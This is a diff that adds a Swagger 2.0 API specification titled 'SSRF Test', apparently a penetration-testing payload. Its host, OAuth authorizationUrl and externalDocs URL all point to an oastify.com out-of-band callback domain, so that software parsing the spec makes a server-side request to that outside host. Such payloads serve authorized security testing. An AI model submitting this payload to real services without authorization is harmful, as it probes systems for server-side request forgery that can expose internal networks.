@@ -1,0 +1,27 @@
+swagger: '2.0'
+info:
+  version: "1.0.0"
+  title: "SSRF Test"
+  description: "Attempting SSRF to trigger a server-side request"
+host: "ke2xxt2e4r7g3tcvuwfx9k0zvq1hpdd2.oastify.com"
+basePath: "/"
+paths:
+  /:
+    get:
+      summary: "SSRF Test Endpoint"
+      description: "Attempts to trigger a request to an external URL"
+      responses:
+        200:
+          description: "Successful response if SSRF occurs"
+
+securityDefinitions:
+  auth:
+    type: oauth2
+    authorizationUrl: "http://ke2xxt2e4r7g3tcvuwfx9k0zvq1hpdd2.oastify.com"
+    flow: implicit
+    scopes:
+      read: "Access external data"
+
+externalDocs:
+  description: "Check for SSRF Trigger"
+  url: "http://ke2xxt2e4r7g3tcvuwfx9k0zvq1hpdd2.oastify.com"
